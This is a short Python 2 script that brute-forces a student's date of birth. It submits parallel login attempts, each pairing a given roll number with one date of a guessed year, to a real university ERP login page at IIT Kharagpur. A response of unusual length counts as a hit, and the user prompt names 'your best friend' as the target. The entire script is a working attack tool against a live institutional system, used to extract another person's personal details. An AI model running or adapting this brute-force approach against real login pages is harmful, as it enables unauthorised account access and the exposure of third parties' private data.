import sys
from mechanize import Browser
from datetime import timedelta, date
from joblib import Parallel, delayed

def spinning_cursor():
  while True:
    for cursor in '|/-\\':
      yield cursor

def daterange(start_date, end_date):
    for n in range(int ((end_date - start_date).days)):
        yield start_date + timedelta(n)

def request_bday(single_date, rollno, start_date, end_date):
  br = Browser()
  br.open("https://erp.iitkgp.ac.in/StudentPerformanceV2/auth/login.htm")
  br.select_form(name="loginform")
  br.form.set_all_readonly(False)

  br["rollno"] = rollno
  br["dob"] = single_date.strftime("%d-%m-%Y")

  response = br.submit()
  if len(response.readlines())!=330:
    flag = 0
    print single_date.strftime("%d-%m-%Y")
    br.close()
    return flag

  br.close()

  # sys.stdout.write(next(spinner))
  # sys.stdout.flush()
  # sys.stdout.write('\b')
  # return flag

def get_bday(rollno, start_date, end_date):
  spinner = spinning_cursor()
  flag = 1
  flag = Parallel(n_jobs=-1)(delayed(request_bday)(single_date, rollno, start_date, end_date) for single_date in daterange(start_date, end_date))
    

  if flag:
    print "Try another year."

def main():
  rollno = raw_input("Enter the rollno of your best friend.: ")
  year   = input("Enter the possible birth year.       : ")
  
  start_date = date(year, 1, 1)
  end_date   = date(year, 12, 31)

  sys.tracebacklimit = 0

  get_bday(rollno, start_date, end_date)

if __name__ == '__main__':
  main()
